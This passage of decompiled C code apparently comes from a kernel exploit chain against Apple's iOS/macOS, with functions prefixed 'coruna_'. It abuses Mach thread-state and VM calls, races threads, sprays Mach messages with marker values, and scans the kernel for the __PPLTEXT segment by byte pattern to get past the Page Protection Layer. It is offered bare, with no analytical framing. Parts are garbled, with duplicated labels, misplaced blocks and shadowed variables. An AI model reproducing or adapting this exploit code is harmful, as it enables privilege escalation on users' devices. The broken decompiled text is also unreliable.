                sa_new[0x3b] = 0;
                sa_new[0x38] = 0;
                sa_new[0x39] = 0;
                sa_new[0x2e] = 0;
                sa_new[0x2f] = 0;
                sa_new[0x2c] = 0;
                sa_new[0x2d] = 0;
                sa_new[0x32] = 0;
                sa_new[0x33] = 0;
                sa_new[0x30] = 0;
                sa_new[0x31] = 0;
                sa_new[0x26] = 0;
                sa_new[0x27] = 0;
                sa_new[0x24] = 0;
                sa_new[0x25] = 0;
                sa_new[0x2a] = 0;
                sa_new[0x2b] = 0;
                sa_new[0x28] = 0;
                sa_new[0x29] = 0;
                sa_new[0x1e] = 0;
                sa_new[0x1f] = 0;
                sa_new[0x1c] = 0;
                sa_new[0x1d] = 0;
                sa_new[0x22] = 0;
                sa_new[0x23] = 0;
                sa_new[0x20] = 0;
                sa_new[0x21] = 0;
                sa_new[0x16] = 0;
                sa_new[0x17] = 0;
                sa_new[0x14] = 0;
                sa_new[0x15] = 0;
                sa_new[0x1a] = 0;
                sa_new[0x1b] = 0;
                sa_new[0x18] = 0;
                sa_new[0x19] = 0;
                sa_new[0xe] = 0;
                sa_new[0xf] = 0;
                sa_new[0xc] = 0;
                sa_new[0xd] = 0;
                sa_new[0x12] = 0;
                sa_new[0x13] = 0;
                sa_new[0x10] = 0;
                sa_new[0x11] = 0;
                sa_new[6] = 0;
                sa_new[7] = 0;
                sa_new[4] = 0;
                sa_new[5] = 0;
                sa_new[10] = 0;
                sa_new[0xb] = 0;
                sa_new[8] = 0;
                sa_new[9] = 0;
                sa_new[2] = 0;
                sa_new[3] = 0;
                sa_new[0] = 0;
                sa_new[1] = 0;
                handle[0x4f] = 0;
                handle[0x4e] = 0;
                handle[0x51] = 0;
                handle[0x50] = 0;
                handle[0x4b] = 0;
                handle[0x4a] = 0;
                handle[0x4d] = 0;
                handle[0x4c] = 0;
                handle[0x47] = 0;
                handle[0x46] = 0;
                handle[0x49] = 0;
                handle[0x48] = 0;
                handle[0x43] = 0;
                handle[0x42] = 0;
                handle[0x45] = 0;
                handle[0x44] = 0;
                handle[0x3f] = 0;
                handle[0x3e] = 0;
                handle[0x41] = 0;
                handle[0x40] = 0;
                handle[0x3b] = 0;
                handle[0x3a] = 0;
                handle[0x3d] = 0;
                handle[0x3c] = 0;
                handle[0x37] = 0;
                handle[0x36] = 0;
                handle[0x39] = 0;
                handle[0x38] = 0;
                handle[0x33] = 0;
                handle[0x32] = 0;
                handle[0x35] = 0;
                handle[0x34] = 0;
                handle[0x30] = handle[0x2d];
                handle[0x31] = 0xc0c0c0c0;
                handle[0x45] = handle[0x2f];
                handle[0x50] = k_kernel_rodata_word_40010;
                handle[0x4e] = k_kernel_rodata_word_40030;
                handle[0x4f] = handle + 0x7f00;
                handle[0x4d] = -0x3f3f3f3f3f3f3f40;
                coruna_call_mach_vm_machine_attribute(handle[1],handle,0xc0c0c0c0,1);
                type_id_10 = 0xffffffffffffc000;
                do {
                  coruna_call_mach_vm_machine_attribute(handle[1],type_id_10 + handle[0x53] + 0x8000,(int)type_id_10 + -0x3f3ebf40,
                               1);
                  type_id_10 = type_id_10 + 0x4000;
                } while (type_id_10 < 0x8000);
                _memcpy((void *)handle[3],&cache_60,0x130);
                _thread_set_state(*(thread_act_t *)(handle + 0x54),6,
                                  (thread_state_t)(handle + 0x30),0x44);
                handle = type_id + 0x128;
                addr = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],handle);
                _memcpy((void *)handle[3],&cache_60,0x130);
                _thread_set_state(*(thread_act_t *)(handle + 0x54),6,sa_new,0x44);
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],handle);
                coruna_kernel6544_residual_217(handle[1],type_id_11);
                do {
                  _memcpy((void *)handle[3],&cache_60,0x130);
                  cache_37 = 0;
                  bootargs = k_kernel_nsconcretestackblock_slot;
                  thread_attr = port;
                  host_info = coruna_thread_set_state_de68;
                  serial_buf = &k_kernel_rodata_word_3c8c8;
                  stack_guard = cache_47;
                  sa_saved = cache_48;
                  action = handle;
                  block_ctx = &cache_37;
                  _pthread_create(&cache_36,(pthread_attr_t *)0x0,(void **)coruna_helper_caac_1c948,&bootargs)
                  ;
                  _semaphore_wait(cache_48);
                  _semaphore_signal(cache_47);
                  *(uint64_t *)(handle[3] + 0xf0) = 0;
                  (*region)(&path_buf,8);
                  cache_37 = 1;
                  serial_9 = handle[3];
                  serial_7 = handle[0x52];
                  do {
                    *(int *)(serial_9 + 0x110) = (int)serial_7;
                    *(long *)(serial_9 + 0x128) = ctx_val;
                  } while (*(long *)(serial_9 + 0xf0) == 0);
                  (*region)(&path_buf,1);
                  _pthread_join(cache_36,(void **)0x0);
                  serial_7 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],handle);
                  inheritance = (vm_inherit_t)base;
                } while ((((serial_7 == addr) || (serial_7 == ctx_val)) || (serial_7 == serial_8)) ||
                        (((buf = (void *)handle[3],
                          *(int *)((long)buf + 0x110) != (int)handle[0x52] || (serial_7 == 0)) ||
                         ((*(long *)((long)buf + 0x108) != handle[0x50] ||
                          (*(long *)((long)buf + 0xf8) != handle[0x4e]))))));
                _memcpy((void *)((long)handle + 0x2c),buf,0x130);
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],handle[0x2d] + 0x128);
                ptr = k_kernel_mach_task_self_slot;
                _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                    (mach_port_name_t *)(handle + 0x2e));
                _mach_port_insert_right
                          (*(ipc_space_t *)ptr,*(mach_port_name_t *)(handle + 0x2e),
                           *(mach_port_name_t *)(handle + 0x2e),0x14);
                _thread_set_exception_ports
                          (*(thread_act_t *)(handle + 0x54),0x1bfe,*(mach_port_t *)(handle + 0x2e)
                           ,2,0x11);
                _thread_resume(*(thread_act_t *)(handle + 0x54));
                msg = _calloc(1,0x800);
                handle[2] = (long)msg;
                _mach_msg(msg,2,0,0x400,*(mach_port_name_t *)(handle + 0x2e),0,0);
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],handle[0x2d] + 0x128);
                _memcpy((void *)handle[3],(void *)((long)handle + 0x2c),0x130);
                type_id_10 = handle[0x2d];
                scratch = 0;
                bootargs = 0;
                cache_51 = 0;
                thread_attr = 0;
                cache_52 = 0;
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_51,0x20,1);
                bootargs = coruna_u64_pack(((int)handle[4]), ((uint32_t))bootargs);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_51,0x20,1);
                _vm_map(*(vm_map_t *)ptr,&scratch,0x4000,0,1,cache_42,
                        type_id_10 & 0xffffffffffffc000,0,3,1,inheritance);
                bootargs = 0;
                cache_51 = 0;
                thread_attr = 0;
                cache_52 = 0;
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_51,0x20,1);
                bootargs = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_46 & 0x3f))), ((uint32_t))bootargs);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_51,0x20,1);
                handle = scratch + (type_id_10 & 0x3fff);
                handle[0x2c] = handle;
                *(uint64_t *)(handle + 0x108) = 0x41414141;
                *(uint32_t *)(handle + 0x110) = 0;
                *(uint64_t *)(handle + 0xf8) = 0x42424242;
                type_id_8 = k_kernel_rodata_word_3b220;
                *(uint64_t *)(handle + 0x90) = k_kernel_rodata_word_0003b228;
                *(uint64_t *)(handle + 0x88) = type_id_8;
                coruna_mach_msg_send(handle,handle[0x2d],0x41414141,0,0x42424242,0x43434343,0x44444444);
                cache_20 = 0;
                cache_59 = 0;
                cache_22 = 0;
                cache_21 = 0;
                frame = 0;
                cache_58 = 0;
                cache = 0;
                work = 0;
                url_buf = 0;
                cache_56 = 0;
                json_buf = 0;
                tmp_buf = 0;
                cache_55 = 0;
                plist = 0;
                region = 0;
                sa_saved = 0;
                cache_54 = 0;
                path_buf = 0;
                sa_new = 0;
                action = 0;
                cache_53 = 0;
                stack_guard = 0;
                block_ctx = 0;
                thread_attr = 0;
                cache_52 = 0;
                serial_buf = 0;
                host_info = 0;
                bootargs = 0;
                cache_51 = 0;
                cache_57 = handle[0x2f];
                coruna_kernel6544_via_mach_msg_send(handle,k_kernel_rodata_word_40040,(int)handle[0x52],handle[0x4e],handle[0x4f],
                             &cache_51);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(handle[1],handle[0x53] + 0xf008,handle[0x53] + 0xefe0,1);
                off = handle[0x53];
                handle = handle[1];
                type_id_8 = (**(void (**)(*handle + 0x10))(handle,handle[0x4e],0x423);
                kind = coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(handle,off + 0xf010,type_id_8,1);
                *(thread_act_t *)(handle + 5) = cache_49;
                if (1 < cache_48 + 1) {
                  tag = _semaphore_destroy(*(task_t *)ptr,cache_48);
                  kind = (unsigned long)tag;
                }
                if (1 < cache_47 + 1) {
                  tag = _semaphore_destroy(*(task_t *)ptr,cache_47);
                  kind = (unsigned long)tag;
                }
                if (*(long *)k_kernel_stack_chk_guard_slot == cache_62[0x20]) {
                  return 0;
                }
                ___stack_chk_fail(kind);
              }
              if (1 < *(thread_act_t *)(handle + 0x54) + 1) {
                _thread_terminate(*(thread_act_t *)(handle + 0x54));
                *(uint32_t *)(handle + 0x54) = 0;
              }
              copy = (task_t *)k_kernel_mach_task_self_slot;
              addr = 0;
              do {
                target_act = *(thread_act_t *)((long)cache_62 + addr);
                if (target_act != 0) {
                  _thread_terminate(target_act);
                }
                addr = addr + 4;
              } while (addr != 0x100);
            }
            if (cache_40 != 0) {
              _thread_terminate(cache_40);
            }
          } while( true );
        }
      }
    }
    base = *str;
    kind = kind + 0x30;
  } while( true );
}





kern_return_t coruna_thread_terminate(long handle)
{
  uint64_t *ptr;
  uint8_t *buf;
  kern_return_t lk3;
  long handle;
  
  ___semwait_signal(*(uint32_t *)(handle + 0x38),*(uint32_t *)(handle + 0x3c),0,0,0,0);
  do {
  } while (**(long **)(handle + 0x20) == 0);
  _thread_terminate(**(thread_act_t **)(handle + 0x28));
  buf = k_kernel_mach_task_self_slot;
  handle = 0;
  do {
    lk3 = _thread_create(*(task_t *)buf,(thread_act_t *)(*(long *)(handle + 0x30) + handle));
    handle = handle + 4;
  } while (handle != 0x100);
  ptr = *(uint64_t **)(handle + 0x20);
  **(uint32_t **)(handle + 0x28) = 0;
  *ptr = 2;
  return lk3;
}





kern_return_t coruna_mach_make_memory_entry_12678(long handle,int flags)
{
  long handle;
  uint8_t *ptr;
  kern_return_t lk3;
  unsigned long u;
  mem_entry_name_port_t scratch;
  
  scratch = 0;
  handle = *(long *)(handle + 0x20);
  coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x28),
               *(unsigned long *)(handle + 0x30) | *(unsigned long *)(handle + 0x30) << 0x20,1);
  u = (unsigned long)(*(long *)(handle + 0x28) - *(long *)(handle + 0x40)) >>
          ((unsigned long)*(uint *)(handle + 0x60) & 0x3f);
  coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x38) + 8,u | u << 0x20,1);
  ptr = k_kernel_mach_task_self_slot;
  _mach_make_memory_entry
            (*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_size_t *)(handle + 0x48),0,
             flags << 0x18 | 0x10003,&scratch,*(mem_entry_name_port_t *)(handle + 100));
  coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x38) + 8,
               *(uint64_t *)(handle + 0x50),1);
  coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x28),
               *(uint64_t *)(handle + 0x58),1);
  lk3 = _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  return lk3;
}





kern_return_t coruna_thread_set_state_12754(long handle)
{
  void (*ptr)(void);
  kern_return_t lk2;
  long handle;
  unsigned long unaff_x30;
  
  handle = *(long *)(handle + 0x20);
  ___semwait_signal(*(uint32_t *)(handle + 0x30),*(uint32_t *)(handle + 0x34),0,0,0,0);
  do {
  } while (**(long **)(handle + 0x28) == 0);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  lk2 = _thread_set_state(*(thread_act_t *)(handle + 0x2a0),6,(thread_state_t)(handle + 0x180),0x44)
  ;
  return lk2;
}





void coruna_vm_deallocate_127c0(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  uint64_t u;
  vm_address_t address;
  long addr;
  uint64_t size;
  long off;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = *(long *)(handle + 8);
  size = *(uint64_t *)(handle + 0x20);
  u = coruna_kernel6544_via_nop_stub_6_2(handle,*(long *)(handle + 0x10) + 0x28);
  handle = coruna_kernel6544_via_ctx_test_flag_6(size,u);
  handle = coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),handle + 0x18);
  ptr = k_kernel_mach_task_self_slot;
  while( true ) {
    off = handle;
    address = coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),off + 0x10);
    addr = coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),off + 0x18);
    err = coruna_kernel6544_residual_244(*(uint64_t *)(handle + 8),off + 0x48);
    if (address == 0x1000000000) break;
    handle = coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),off + 8);
    if (err < 0) {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      bootargs = 0;
      off = off + 0x30;
      coruna_kernel6544_via_nop_stub_6(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      scratch = coruna_u64_pack(((int)*(uint64_t *)(handle + 0x20)), ((uint32_t))scratch);
      coruna_kernel6544_via_nop_stub_7(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      bootargs = 0;
      coruna_kernel6544_via_nop_stub_6(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      bootargs = coruna_u64_pack((bootargs), (err)) & 0xffffffff7fffffff;
      coruna_kernel6544_via_nop_stub_7(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      _vm_deallocate(*(vm_map_t *)ptr,address,addr - address);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail();
}





uint32_t coruna_cfdictionaryapplyfunction(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cfboolean_typeid);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cfboolean_typeid(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t size;
  long scratch;
  int bootargs [2];
  long thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    err = 0xad001;
  }
  else {
    handle = _CFGetTypeID(addr_2);
    addr = _CFStringGetTypeID();
    if ((((addr == handle) || (addr = _CFArrayGetTypeID(), addr == handle)) ||
        (addr = _CFBooleanGetTypeID(), addr == handle)) ||
       (addr = _CFNumberGetTypeID(), addr == handle)) {
      scratch = 0;
      err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&scratch);
      if (err == 0) {
fail:
        if (*flags != 0) {
          return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
      handle = _CFGetTypeID(scratch);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        off = _CFArrayGetTypeID();
        addr = scratch;
        if (off == handle) {
          err = 0xad001;
          if (scratch != 0) {
            handle = _CFGetTypeID(scratch);
            off = _CFArrayGetTypeID();
            if (handle == off) {
              handle = _CFGetTypeID(addr_2);
              off = _CFArrayGetTypeID();
              if (handle == off) {
                handle = _CFGetTypeID(addr_2);
                off = _CFArrayGetTypeID();
                err = 0xad001;
                if (handle == off) {
                  bootargs[0] = coruna_cat(bootargs[0],1);
                  u = _CFArrayGetCount(addr_2);
                  size = coruna_fn_ptr_cast(coruna_cfstringgettypeid);
                  _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                  if ((char)bootargs[0] == '\0') {
                    err = 0xad014;
                  }
                  else {
                    bootargs[0] = 0;
                    thread_attr = addr;
                    u = _CFArrayGetCount(addr_2);
                    size = coruna_fn_ptr_cast(coruna_cfarray_append_unique);
                    _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                    err = bootargs[0];
                  }
                }
              }
            }
          }
          *flags = err;
          return;
        }
        if (*flags != 0) {
        return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
    }
    err = 0xad014;
  }
  *flags = err;
  return;
}





uint32_t coruna_cfdictionaryapplyfunction_d26c(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cf_equal);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cf_equal(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  int scratch [2];
  uint64_t bootargs;
  uint64_t thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    scratch[0] = 0xad001;
  }
  else {
    thread_attr = 0;
    err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&thread_attr);
    if (err == 0) {
      scratch[0] = 0xad011;
    }
    else {
      handle = _CFGetTypeID(thread_attr);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        addr = _CFArrayGetTypeID();
        if (addr == handle) {
          scratch[0] = 0;
          bootargs = thread_attr;
          u = _CFArrayGetCount(addr_2);
          size = coruna_fn_ptr_cast(coruna_cfarraycontainsvalue);
          _CFArrayApplyFunction(addr_2,0,u,size,scratch);
          *flags = scratch[0];
          return;
        }
        err = _CFEqual(addr_2,thread_attr);
        if (err != 0) {
          *flags = 0;
          return;
        }
      }
      scratch[0] = 0xad014;
    }
  }
fail:
  *flags = scratch[0];
  return;
}





void coruna_cfarray_append_unique(long handle,int *flags)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long unaff_x30;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    if (handle == 0) {
      *flags = 0xad001;
    }
    else {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err == 0) {
        if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
        _CFArrayAppendValue(*(uint64_t *)(flags + 2),handle);
        return;
      }
    }
  }
  return;
}





void coruna_cfstringgettypeid(long handle,uint8_t *buf)
{
  long handle;
  long addr;
  
  if (buf != (uint8_t *)0x0) {
    if (handle != 0) {
      handle = _CFGetTypeID();
      addr = _CFStringGetTypeID();
      if (handle == addr) {
        return;
      }
    }
    *buf = 0;
  }
  return;
}





void coruna_cfarraycontainsvalue(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    err = 0xad001;
    if (handle != 0) {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err != 0) {
        return;
      }
      err = 0xad011;
    }
    *flags = err;
  }
  return;
}





void coruna_kernel6544_via_ctx_test_flag(long handle)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  
  err = coruna_ctx_test_flag(handle,0x5184000);
  if (((err == 0) ||
      ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))))
     && ((err = coruna_ctx_test_flag(handle,0x5100000), err == 0 ||
         ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(handle + 0x140))))
          ))))) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err != 0) && (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158))) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_fn_ptr_cast_2(handle);
      return;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    coruna_kernel29d3c_via_free_1b984(handle);
    return;
  }
  return;
}





bool coruna_kernel6544_via_ctx_test_flag_2(uint64_t val)
{
  int err;
  
  err = coruna_ctx_test_flag(val,0x5184001);
  return err != 0;
}





uint64_t coruna_return_zero_d6bc(long handle,unsigned long arg,long addr_2,unsigned long arg)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  unsigned long scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  long host_info;
  
  thread_attr = 0;
  host_info = 0;
  scratch = 0;
  bootargs = 0;
  port = coruna_ctx_test_flag(handle,0x5184001);
  if ((int)port == 0) {
    return port;
  }
  if (arg == 0) {
    return 0;
  }
  if (addr_2 == 0) {
    return 0;
  }
  if ((int)arg == 0) {
    return 0;
  }
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    port = coruna_find_ppltext(handle,&thread_attr,(long)&bootargs + 4);
    version = thread_attr;
    if ((int)port == 0) {
      return port;
    }
    if (thread_attr <= arg) {
      u = arg + (arg & 0xffffffff);
      size = bootargs;
      type_id_8 = (unsigned long)bootargs;
      if (u <= thread_attr + type_id_8) {
        port = coruna_kernel6544_via_return_zero_2e7b0(handle,3,&host_info);
        if ((int)port == 0) {
          return port;
        }
        if (host_info == 0) {
          type_id = type_id_8 + 8;
          if (size < 0x8c001 && *(long *)(handle + 0x158) + 0xffe7f6f5f8700000U < 0xf78900000) {
            type_id = 0x8c008;
          }
          kind = (unsigned long)*(uint *)(handle + 0x180);
          tag = 0;
          if (kind != 0) {
            tag = type_id / kind;
          }
          handle = type_id - tag * kind;
          err = 0;
          if (handle != 0) {
            err = *(uint *)(handle + 0x180) - (int)handle;
          }
          bootargs = coruna_u64_pack((bootargs), (int)type_id + err);
          host_info = coruna_vm_deallocate_2c8ec(handle,&bootargs);
          if (host_info == 0) {
            return 0;
          }
          port = coruna_kernel6544_via_nop_stub_7_4(handle,3,host_info);
          if ((int)port == 0) {
            return port;
          }
        }
        tag = *(unsigned long *)(handle + 0x188);
        for (type_id = arg & (tag ^ 0xffffffffffffffff);
            type_id <= (u - 1 & (tag ^ 0xffffffffffffffff));
            type_id = type_id + *(uint *)(handle + 0x180)) {
          port = coruna_nop_stub_6(handle,host_info + type_id_8,8,&scratch);
          if ((int)port == 0) {
            return port;
          }
          kind = type_id - version;
          type_id_9 = (unsigned long)(1 << (unsigned long)((uint)(kind >> 0xe) & 0x1f));
          if ((scratch & type_id_9) == 0) {
            port = coruna_kernel6544_via_nop_stub_3_2(handle,host_info + kind,type_id);
            if ((int)port == 0) {
              return port;
            }
            scratch = scratch | type_id_9;
            port = coruna_nop_stub_7(handle,host_info + type_id_8,&scratch,8);
            if ((int)port == 0) {
              return port;
            }
          }
        }
        port = coruna_nop_stub_7(handle,(arg - version) + host_info,addr_2,arg);
        err = (int)port;
        goto joined_r0x0000d884;
      }
    }
    port = 0;
  }
  else {
    port = coruna_kernel6544_via_slot_clear(handle,arg,addr_2,arg,0);
    err = (int)port;
joined_r0x0000d884:
    if (err != 0) {
      port = 1;
    }
  }
  return port;
}





bool coruna_kernel6544_via_slot_clear(long handle,unsigned long arg,uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint u;
  unsigned long *ptr;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long port;
  uint scratch;
  long bootargs;
  
  err = coruna_mach_absolute_time_1b5b4(handle,5,&k_kernel_slot_2710);
  return err == 0;
}





void coruna_find_ppltext(long handle,long *addr_2,int *flags)
{
  bool err;
  long handle;
  int err;
  int status;
  unsigned long u;
  long addr;
  char *ptr;
  uint64_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  long serial_buf;
  unsigned long action;
  
  addr = *(long *)(&k_kernel_slot_1888 + handle);
  if (addr != 0) {
    err = *(int *)(&k_kernel_slot_1890 + handle);
    *addr_2 = addr;
    *flags = err;
    return;
  }
  err = *(int *)(*(long *)(&k_kernel_slot_19f8 + handle) + 0x70);
  if (err < 0x2258) {
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
    }
    check_ok:
    coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
    if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
    return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
    return;
    }
    serial_buf = serial_buf + u;
    }
    bootargs = serial_buf;
    scratch = host_info;
    thread_attr = action;
    handle = coruna_strsep(&scratch,ptr,0,1);
    if (handle == 0) {
    return;
      }
      check_ok:
      coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
      if (serial_buf == 0) {
      return;
    }
    ptr = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
  }
  else {
    if (err != 0x2258 && err != 0x225c) {
      status = 0x2712;
cleanup:
      if (err != status) {
        ptr = (char *)0x0;
        coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
        if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
        if (serial_buf == 0) {
        return;
        }
        u = (unsigned long)*(uint *)(handle + 0x180);
        err = action < u;
        action = action - u;
        if (err || action == 0) {
        return;
        }
        serial_buf = serial_buf + u;
        }
        bootargs = serial_buf;
        scratch = host_info;
        thread_attr = action;
        handle = coruna_strsep(&scratch,ptr,0,1);
        if (handle == 0) {
        return;
        }
        addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
        if (addr == 0) {
        addr = 0;
        }
        else {
        addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        err = 0;
        }
        else {
        handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
        if (handle == 0) {
        return;
        }
        handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
        if (handle == 0) {
        return;
        }
        err = (int)handle - (int)addr;
        }
        if (addr == 0) {
        return;
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        if (*(int *)(handle + 0x140) < 0x1809) {
        err = 0x90000;
        }
        else {
        err = 0x88000;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
        }
        }
        }
        *(long *)(&k_kernel_slot_1888 + handle) = addr;
        *(int *)(&k_kernel_slot_1890 + handle) = err;
        *addr_2 = addr;
        *flags = err;
        return;
      }
    }
done:
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
  }
check_ok:
  coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
  if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
      return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
      return;
    }
    serial_buf = serial_buf + u;
  }
  bootargs = serial_buf;
  scratch = host_info;
  thread_attr = action;
  handle = coruna_strsep(&scratch,ptr,0,1);
  if (handle == 0) {
    return;
  }
  addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
  if (addr == 0) {
    addr = 0;
  }
  else {
    addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
